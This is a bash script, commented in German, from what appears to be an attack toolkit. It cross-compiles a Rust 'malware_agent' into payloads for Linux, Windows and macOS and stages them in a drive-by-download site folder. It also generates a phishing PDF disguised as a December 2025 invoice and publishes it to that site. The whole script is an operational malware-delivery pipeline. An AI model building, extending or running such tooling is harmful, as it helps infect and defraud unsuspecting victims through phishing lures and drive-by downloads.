#!/bin/bash

# ==========================================
#  3. BUILD & DEPLOY PAYLOADS
# ==========================================

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
AGENT_DIR="$ROOT_DIR/malware_agent"
DELIVERY_DIR="$ROOT_DIR/delivery/DbD-Site"
FILES_DIR="$DELIVERY_DIR/files"
PDF_DIR="$ROOT_DIR/delivery/pdf_phishing"

print_status() { echo -e "${BLUE}[*] $1${NC}"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }
print_error() { echo -e "${RED}[!] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }

# 1. Vorbereitung
# ------------------------------------------
print_status "Bereite Verzeichnisse vor..."
mkdir -p "$FILES_DIR"

if ! command -v cargo &>/dev/null; then
  print_error "Rust (cargo) ist nicht installiert!"
  exit 1
fi

if [ ! -d "$AGENT_DIR" ]; then
  print_error "Agent Verzeichnis nicht gefunden: $AGENT_DIR"
  exit 1
fi
cd "$AGENT_DIR" || exit

# Namen aus Cargo.toml
BINARY_NAME=$(grep -m 1 '^name =' Cargo.toml | cut -d '"' -f 2)
if [ -z "$BINARY_NAME" ]; then
  print_error "Konnte 'name' nicht aus Cargo.toml lesen."
  exit 1
fi
print_status "Projekt-Name: '$BINARY_NAME'"

# 2. Kompilierung
# ------------------------------------------

# LINUX
print_status "Kompiliere für LINUX..."
if cargo build --release; then
  if [ -f "target/release/$BINARY_NAME" ]; then
    cp "target/release/$BINARY_NAME" "$FILES_DIR/payload_linux"
    print_success "Linux Payload OK."
  else
    print_error "Linux Binary nicht gefunden."
  fi
else
  print_error "Linux Build fehlgeschlagen."
  exit 1
fi

# WINDOWS
print_status "Kompiliere für WINDOWS..."
if ! rustup target list --installed | grep "x86_64-pc-windows-gnu" >/dev/null; then
  print_warning "Installiere Windows Target..."
  rustup target add x86_64-pc-windows-gnu
fi

if cargo build --release --target x86_64-pc-windows-gnu; then
  if [ -f "target/x86_64-pc-windows-gnu/release/$BINARY_NAME.exe" ]; then
    cp "target/x86_64-pc-windows-gnu/release/$BINARY_NAME.exe" "$FILES_DIR/payload_win.exe"
    print_success "Windows Payload OK."
  else
    print_error "Windows Binary nicht gefunden."
  fi
else
  print_warning "Windows Build fehlgeschlagen (MinGW fehlt?)."
fi

# MACOS (Dummy/Cross)
print_status "Prüfe MacOS Build..."
if [[ "$OSTYPE" == "darwin"* ]]; then
  cargo build --release && cp "target/release/$BINARY_NAME" "$FILES_DIR/payload_mac"
elif rustup target list --installed | grep "x86_64-apple-darwin" >/dev/null; then
  # Versuch Cross Compile
  if cargo build --release --target x86_64-apple-darwin; then
    cp "target/x86_64-apple-darwin/release/$BINARY_NAME" "$FILES_DIR/payload_mac"
  else
    echo "Dummy Mac Payload" >"$FILES_DIR/payload_mac"
  fi
else
  echo "Dummy Mac Payload" >"$FILES_DIR/payload_mac"
fi

# 3. PDF Generierung
# ------------------------------------------
print_status "Generiere Phishing-PDF..."
cd "$PDF_DIR" || exit

VENV_ACTIVATED=0
if [ -f ".venv/bin/activate" ]; then
  source .venv/bin/activate
  VENV_ACTIVATED=1
elif [ -f "../.venv/bin/activate" ]; then
  source ../.venv/bin/activate
  VENV_ACTIVATED=1
fi

# Skript ausführen
if python3 generate_phishing_pdf.py; then
  # PDF Name muss zum Python Skript passen!
  PDF_NAME="Rechnung_2025_Dezember.pdf"
  TARGET_PDF="$DELIVERY_DIR/public/$PDF_NAME"
  mkdir -p "$DELIVERY_DIR/public"

  if [ -f "$PDF_NAME" ]; then
    cp "$PDF_NAME" "$TARGET_PDF"
    print_success "PDF aktualisiert: $TARGET_PDF"
  else
    print_error "PDF ($PDF_NAME) wurde nicht generiert."
  fi
else
  print_error "Fehler im Python PDF Skript."
fi

if [ $VENV_ACTIVATED -eq 1 ]; then deactivate; fi

echo ""
echo -e "${GREEN}BUILD COMPLETE${NC}"
echo "Payloads liegen in: $FILES_DIR"
ls -lh "$FILES_DIR" | grep "payload"
